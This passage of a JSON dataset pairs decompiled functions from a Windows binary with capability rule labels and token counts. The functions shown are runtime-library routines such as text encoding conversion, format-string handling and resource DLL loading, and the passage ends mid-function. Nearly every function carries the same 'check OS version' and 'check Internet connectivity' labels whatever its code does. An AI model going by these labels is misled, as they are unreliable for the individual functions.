&lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 858
    },
    "00406c2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406c2c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00406c2c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00406c2c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x406e5c;\n    uVar5 = 0x80000001;\n    noname_12 = 0x406c6b;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00406c2c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x406e5c;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x406c89;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00406c2c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x406e78;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00406c2c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00406c2c::lpLibFileName);\n                    for (puVar3 = &fcn.00406c2c::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00406c2c::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00406c2c::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_12h, 0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00406a68(noname_0, 0x406d31, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00406c2c::lpLibFileName, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x406e98, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406d38);\n    return iVar1;\n}\n",
        "token_count": 1615
    },
    "00406f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406f30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x491044;\n    if (*0x491044 != NULL) {\n        do {\n            uStack32 = 0x406f6b;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00407180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407180(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "0040725c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040725c(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 848
    },
    "004085d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004085d4(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x408684, 0x408670);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x40868c);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x40869c);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086b4);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 339
    },
    "004086cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004086cc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x408707;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x497800 = *0x497800 + 1;\n    if ((*0x497800 == 0) && (*0x497804 != 0)) {\n        iStack20 = *0x497804;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 168
    },
    "0040f770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040f770(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040f72c();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040f5a4();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040f508();\n        }\n        while( true ) {\n            iVar2 = fcn.0040f528();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040f528();\n            if (iVar2 != 0) {\n                fcn.0040f760();\n            }\n        }\n        fcn.0040f72c();\n        if (bVar4) {\n            fcn.0040f514();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040f508();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 385
    },
    "00409edc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00409edc(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403ec4();\n    if (iStack20 != 0) {\n        fcn.0040976c();\n    }\n    return uVar1;\n}\n",
        "token_count": 69
    },
    "00409f18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f18(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00409f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f30(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00409f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f50(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00406554();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 98
    },
    "0040a868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a868(void)\n\n{\n    ushort uVar1;\n    char *in_EAX;\n    ushort *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (*in_EAX == '\\0') {\n        return 0;\n    }\n    puVar2 = in_EAX + 1 & 0xfffffffe;\n    while( true ) {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            uVar3 = uVar1;\n            uVar4 = uVar1 >> 8;\n        } while ((uVar3 & uVar4) != 0);\n        if (uVar3 == 0) break;\n        if (uVar4 == 0) {\n            return -in_EAX + -1 + puVar2;\n        }\n    }\n    return -in_EAX + -2 + puVar2;\n}\n",
        "token_count": 210
    },
    "0040ab70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040ab70(void)\n\n{\n    if (**0x494cd0 != NULL) {\n        (***0x494cd0)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 50
    },
    "0040aba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ac6f)\n\nvoid __cdecl fcn.0040aba0(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x0040abc9:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x0040abf3;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x0040af07:\n    fcn.0040aef7();\n    return;\ncode_r0x0040abf3:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x0040af07;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040ac82(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x0040ac12;\n    if (in_ECX == extraout_ECX) goto code_r0x0040af07;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x0040abf3;\ncode_r0x0040ac12:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x0040af07;\n        in_ECX = in_ECX + 1;\n        fcn.0040ac82(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.0040acca(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x0040abc9;\n}\n",
        "token_count": 1193
    },
    "0040ac82": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac82(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x0040af07:\n            fcn.0040aef7();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x0040af07;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0040b0cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b0cc(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040b3a0(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.0040b1cb();\n        puVar4 = extraout_ECX * 3 + 0x40b1bc;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x40b1a8))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 452
    },
    "0040b1cb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b1cb(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0040b3a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b3a0(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040b3cd(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040b4ef(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0040b3cd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3cd(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040b3f8:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00404124();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x491880);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x49188c);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 